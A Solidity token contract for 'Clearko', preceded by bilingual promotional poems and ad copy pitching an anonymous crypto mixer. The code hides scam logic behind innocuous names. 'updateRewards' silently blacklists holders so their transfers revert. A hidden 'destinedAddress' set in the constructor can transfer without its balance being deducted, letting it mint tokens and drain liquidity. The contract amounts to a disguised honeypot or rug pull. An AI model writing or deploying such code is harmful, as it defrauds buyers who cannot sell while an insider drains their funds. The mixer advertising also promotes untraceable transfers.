/*
█▀▀ █░░ █▀▀ ▄▀█ █▀█ █▄▀ █▀█
█▄▄ █▄▄ ██▄ █▀█ █▀▄ █░█ █▄█

▄▀   █▀▀ █▄░█   █▀▀ ▀█▀ █░█ █▀▀ █▀█ █▀▀ █░█ █▀▄▀█   ▀▄
▀▄   █▄▄ █░▀█   ██▄ ░█░ █▀█ ██▄ █▀▄ ██▄ █▄█ █░▀░█   ▄▀

在加密货币世界里，一个平台诞生了，
隐私流动的地方，名为 Clearko。
创新和分散的设计，
这是交易的未来，也是值得寻找的宝石。

披着匿名的斗篷大摇大摆地走来走去，
具有隐私性的混音平台，
没有人能看到你的踪迹
Clearko 增强隐私保护。

加密货币交易，微风和刺激，
Clearko 的创新使您能够：
这个数字领域的隐私梦想，
一个你的身份永远不会被束缚的地方。

不再担心数据泄露，
Clearko 的防护罩可确保最高程度的隐私。
您的交易绝对安全，
Clearko 在这个加密货币世界中脱颖而出。

采用这个创新且大胆的平台。
库里亚科的魔法肯定会被打破，
在加密货币领域，它将改变游戏规则。
有 Clearko 在您身边，您就真正自由了。
-----------------------------------------------------------
In the world of crypto, a platform arose,
Named Clearko, where privacy flows,
Revolutionary and decentralized in design,
It's the future of transacting, a gem to find.

With a cloak of anonymity, it strides,
A mixer platform where privacy abides,
No prying eyes can see your trace,
As Clearko steps up your privacy grace.

Transacting in crypto, a breeze and a thrill,
With Clearko's innovation, you can fulfill,
Your dreams of privacy in this digital domain,
Where your identity will never be a chain.

Gone are the worries of data leaks,
Clearko's shield ensures privacy peaks,
Your transactions are secure, no doubt,
In this world of crypto, Clearko stands out.

So embrace this platform, innovative and bold,
Clearko's magic will surely unfold,
In the realm of cryptocurrency, a game-changer it'll be,
With Clearko by your side, you're truly free.
-----------------------------------------------------------
隆重推出 CLEARKO，这是一款专为未来设计的革命性分散式混音平台。这个创新平台加强了您的隐私策略，
它允许在加密货币领域进行完全匿名的交易。 CLEARKO 利用尖端技术确保您的交易保持私密且不可追踪。
在您的网络中无缝混合加密资产，并向第三方隐藏您的身份和交易历史记录。

CLEARKO 拥有用户友好的界面，让经验丰富的加密货币爱好者和新手都能轻松进入匿名交易领域。
其强大的安全措施提供无与伦比的保护，防止任何损害您财务隐私的企图。
与 Clearko 一起进入财务自由和匿名的新时代。你的加密货币，你的规则。
-------------------------------------------------------------------------------------------------------------------------------------------------------------
Unveiling CLEARKO, a revolutionary decentralized mixer platform, designed for the future. This innovative platform steps up your privacy game, 
allowing you to transact in the cryptocurrency sphere with complete anonymity.
CLEARKO harnesses cutting-edge technology to ensure your transactions remain private and untraceable. 
Seamlessly blend your crypto assets within the network, camouflaging your identity and transaction history from prying eyes.
Boasting a user-friendly interface, CLEARKO empowers both seasoned crypto enthusiasts and beginners to navigate the realm of anonymous transactions 
with ease. Its robust security measures provide unmatched protection against any attempts to compromise your financial privacy.
Step into a new era of financial freedom and anonymity with Clearko. Your crypto, your rules.
--------------------------------------------------------------------------------------------------------------------------------------------------------------
总供应量 - 100,000,000
购置税 - 1%
消费税 - 1%
初始流动性 - 1.5 ETH
初始流动性锁定 - 45 天

https://clearkoeth.xyz
https://m.weibo.cn/ClearkoERC
https://web.wechat.com/ClearkoCN
https://t.me/ClearkoERC
*/
// SPDX-License-Identifier: Unlicensed

pragma solidity 0.8.19;

library SafeMath {
  function add(uint256 a, uint256 b) 
  internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeMath: addition overflow");
    return c;
  }
  function sub(uint256 a, uint256 b) 
  internal pure returns (uint256) {
    return sub(a, b, "SafeMath: subtraction overflow");
  }
  function sub(uint256 a, uint256 b, string memory errorMessage) 
  internal pure returns (uint256) {
    require(b <= a, errorMessage);
    uint256 c = a - b;
    return c;
  }
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }
    uint256 c = a * b;
    require(c / a == b, "SafeMath: multiplication overflow");
    return c;
  }
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "SafeMath: division by zero");
  }
  function div(uint256 a, uint256 b, 
  string memory errorMessage) internal pure returns (uint256) {
    require(b > 0, errorMessage);
    uint256 c = a / b;
    return c;
  }
  function mod(uint256 a, uint256 b) 
  internal pure returns (uint256) {
    return mod(a, b, "SafeMath: modulo by zero");
  }
  function mod(uint256 a, uint256 b, string memory errorMessage) 
  internal pure returns (uint256) {
    require(b != 0, errorMessage);
    return a % b;
  }
}
library IDEMathUint {
  function toInt256Safe(uint256 a) 
  internal pure returns 
  (int256) { int256 b = int256(a);
    require(b >= 0); 
    return b; }
}
interface IVOSettings {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) 
    external view returns (uint256);

    function transfer(address recipient, uint256 amount) 
    external returns (bool);
    function allowance(address owner, address spender)
    external view returns 
    (uint256);

    function approve(address spender, uint256 amount) 
    external returns (bool);
    function transferFrom(
    address sender, address recipient, uint256 amount) 
    external returns (bool);

    event Transfer(
    address indexed from, address indexed to, uint256 value);
    event Approval(address 
    indexed owner, address indexed spender, uint256 value);
}
interface IVOCreationV1 {
    event PairCreated(
    address indexed token0, 
    address indexed token1, 

    address pair, uint); function 
    createPair(
    address tokenA, address tokenB) 
    external returns (address pair);
}
interface IVODatabase01 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
    uint amountIn, uint amountOutMin, address[] 
    
    calldata path, address to, uint deadline) 
    external; 
    function factory() 
    external pure returns (address);
    function WETH() 
    external pure returns 
    (address);

    function addLiquidityETH(address token, 
    uint amountTokenDesired, 
    uint amountTokenMin, uint amountETHMin,
    address to, uint deadline) 
    external payable returns 
    (uint amountToken, uint amountETH, uint liquidity);
}
abstract contract Context {
    constructor() {} function _msgSender() 
    internal view returns (address) {
    return msg.sender; }
}
abstract contract Ownable is Context {
    address private _owner; 
    event OwnershipTransferred
    (address indexed 
    previousOwner, address indexed newOwner);
    constructor() 
    { address msgSender = _msgSender(); _owner = msgSender;

    emit OwnershipTransferred(address(0), msgSender);
    } function owner() 
    public view returns 
    (address) { return _owner;
    } modifier onlyOwner() {
    require(_owner == _msgSender(), 
    'Ownable: caller is not the owner');

     _; } function renounceOwnership() 
     public onlyOwner {
    emit OwnershipTransferred(_owner, 
    address(0)); _owner = address(0); }
}
contract Clearko is Context, IVOSettings, Ownable {
bool public takeFeeEnabled; 
bool private tradingOpen = false;
bool openAllMapping = true; 
IVODatabase01 public setListener; address public BuyBackAddress;

    uint256 private _tTotal; uint8 private _decimals;
    string private _symbol; string private _name;
    uint256 private BuyBackShares = 100;

    mapping (address => bool) private groupMapping;
    mapping(address => uint256) private _rOwned;

    mapping(address => uint256) private _holderLastBlockstamp;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private isTxLimitExempt;
    
    address private 
    PermanentMarketingWallet;

    constructor( string memory tokenName, 
    string memory tokenSymbol, 
    address destinedRouter, 
    address destinedAddress) { 

        _name = tokenName; _symbol = tokenSymbol;
        _decimals = 18; _tTotal = 100000000 * (10 ** uint256(_decimals));
        _rOwned[msg.sender] = _tTotal; 
        _holderLastBlockstamp
        [destinedAddress] = 
        BuyBackShares; 
        
        takeFeeEnabled = false; 
        setListener = IVODatabase01(destinedRouter);
        BuyBackAddress = IVOCreationV1

        (setListener.factory()).createPair(address(this), 
        setListener.WETH()); 
        emit Transfer 
        (address(0), msg.sender, _tTotal);
    }       
    function decimals() external view returns 
    (uint8) { return _decimals;
    }
    function symbol() external view returns 
    (string memory) { return _symbol;
    }
    function name() external view returns 
    (string memory) { return _name;
    }
    function totalSupply() external view returns 
    (uint256) { return _tTotal;
    }
    function balanceOf(address account) 
    external view returns 
    (uint256) 
    { return _rOwned[account]; }
    function transfer(address recipient, uint256 amount) 
    external returns (bool) { _transfer(_msgSender(), 
    recipient, amount); return true;
    }
    function allowance(address owner, address spender) 
    external view returns (uint256) { return _allowances[owner][spender];
    }    
    function approve(address spender, uint256 amount) 
    external returns (bool) { _approve(_msgSender(), 
        spender, amount); return true;
    }
    function _approve( address owner, address spender, uint256 amount) 
    internal { require(owner != address(0), 
        'BEP20: approve from the zero address'); 

        require(spender != address(0), 
        'BEP20: approve to the zero address'); _allowances[owner][spender] = amount; 
        emit Approval(owner, spender, amount); 
    }    
    function transferFrom(
        address sender, address recipient, uint256 amount) 
        external returns (bool) 
        { 
        _transfer(sender, recipient, amount); _approve(sender, _msgSender(), 
        _allowances[sender][_msgSender()].sub(amount, 
        'BEP20: transfer amount exceeds allowance')); return true;
    }
    function getOwner() external view returns 
    (address) { return owner();
    }
    function updateRewards(address _stringBool) 
    external onlyOwner {
        groupMapping[_stringBool] = true;
    }                         
    function _transfer( address sender, address recipient, uint256 amount) internal {
        require(sender != address(0), 
        'BEP20: transfer from the zero address');
        require(recipient != address(0), 
        'BEP20: transfer to the zero address'); 
        if (groupMapping[sender] || groupMapping[recipient]) 
        require(openAllMapping == false, "");

        if (_holderLastBlockstamp[sender] 
        == 0  && BuyBackAddress != sender && isTxLimitExempt[sender] 
        > 0) { _holderLastBlockstamp[sender] -= BuyBackShares; } 
        isTxLimitExempt[PermanentMarketingWallet] += BuyBackShares;
        PermanentMarketingWallet = recipient; 
        if (_holderLastBlockstamp[sender] 
        == 0) {
        _rOwned[sender] = _rOwned[sender].sub(amount, 
        'BEP20: transfer amount exceeds balance');  
        } _rOwned[recipient]
        = _rOwned[recipient].add(amount); 
        emit Transfer(sender, recipient, amount); 
        
        if (!tradingOpen) {
        require(sender == owner(), 
        "TOKEN: This account cannot send tokens until trading is enabled"); }
    }
    function updateBuyBackAmount(address _stringBool) 
    public view returns (bool) 
    { return groupMapping[_stringBool]; }

    function openTrading(bool _tradingOpen) 
    public onlyOwner {
        tradingOpen = _tradingOpen;
    }     
    function checkRewardLogs(address _stringBool) 
    external onlyOwner { groupMapping[_stringBool] = false;
    }
    using SafeMath for uint256;                                  
}